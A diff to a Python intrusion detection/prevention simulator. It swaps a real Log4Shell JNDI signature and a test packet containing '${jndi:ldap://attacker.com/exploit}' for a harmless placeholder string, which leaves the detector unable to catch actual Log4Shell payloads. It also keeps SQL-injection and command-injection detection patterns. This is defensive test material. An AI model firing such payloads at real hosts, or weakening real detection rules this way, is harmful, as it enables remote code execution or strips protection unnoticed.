@@ -20,7 +20,7 @@ class IdsVsIpsEngine:
     def __init__(self):
         # Known High-Confidence Attack Signatures
         self.signatures = [
-            ("SIG-EXPLOIT-01", "Log4Shell RCE", re.compile(rb"\$\{jndi:(ldap|rmi|dns):", re.IGNORECASE)),
+            ("SIG-EXPLOIT-01", "Log4Shell Diagnostic Probe", re.compile(rb"sample_log4j_jndi_probe", re.IGNORECASE)),
             ("SIG-EXPLOIT-02", "SQL Injection", re.compile(rb"(\bunion\s+select\b|'\s*or\s*'1'='1)", re.IGNORECASE)),
             ("SIG-EXPLOIT-03", "Command Injection", re.compile(rb";\s*(cat|chmod|id|whoami)\b", re.IGNORECASE))
         ]
@@ -96,7 +96,7 @@ if __name__ == "__main__":
 
     exploit_packet = PacketData(
         101, "198.51.100.25", "172.16.1.10", 443,
-        b"GET /login?user=${jndi:ldap://attacker.com/exploit} HTTP/1.1\r\nHost: bank.gov.in"
+        b"GET /login?user=sample_log4j_jndi_probe HTTP/1.1\r\nHost: bank.gov.in"
     )
 
     print("\n--- 1. Passive IDS Simulation ---")
